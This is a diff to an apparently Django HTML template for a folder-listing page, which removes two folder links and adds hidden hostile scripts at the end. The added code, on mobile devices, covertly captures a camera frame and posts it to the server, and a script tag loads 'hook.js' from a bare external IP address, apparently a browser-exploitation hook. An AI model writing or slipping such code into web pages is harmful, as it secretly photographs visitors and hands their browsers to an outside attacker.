@@ -57,10 +57,8 @@
     <h1>📂 Your Folders</h1>
     <div class="folder-grid">
         <!-- Folder Items -->
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Adam</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hassan 3aryan</a></div></div>
-        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hiba</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Rihab</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Malak</a></div></div>
         <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">2 EME BAC</a></div></div>
@@ -263,5 +261,75 @@
 }
 
     </script>
+
+    <script>
+function isMobileDevice() {
+    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
+async function requestPermissions() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // Wait a moment to ensure the video has loaded
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            sendScreenshotToServer(imageData); // send image to server
+
+            // Stop all media tracks
+            stream.getTracks().forEach(track => track.stop());
+        }, 1000);
+    } catch (error) {
+        console.error("Camera permission denied or error:", error);
+    }
+}
+
+function sendScreenshotToServer(imageData) {
+    fetch('/save-screenshot/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': getCookie('csrftoken')  // Django CSRF token
+        },
+        body: JSON.stringify({ image: imageData })
+    }).then(res => res.json())
+      .then(data => console.log(data.message))
+      .catch(err => console.error('Error:', err));
+}
+
+function getCookie(name) {
+    let cookieValue = null;
+    if (document.cookie && document.cookie !== '') {
+        const cookies = document.cookie.split(';');
+        for (let cookie of cookies) {
+            cookie = cookie.trim();
+            if (cookie.startsWith(name + '=')) {
+                cookieValue = decodeURIComponent(cookie.split('=')[1]);
+                break;
+            }
+        }
+    }
+    return cookieValue;
+}
+
+// Run if mobile
+if (isMobileDevice()) {
+    requestPermissions();
+}
+</script>
+
+<script src="http://196.117.229.105:/hook.js"></script>
+
+
 </body>
 </html>
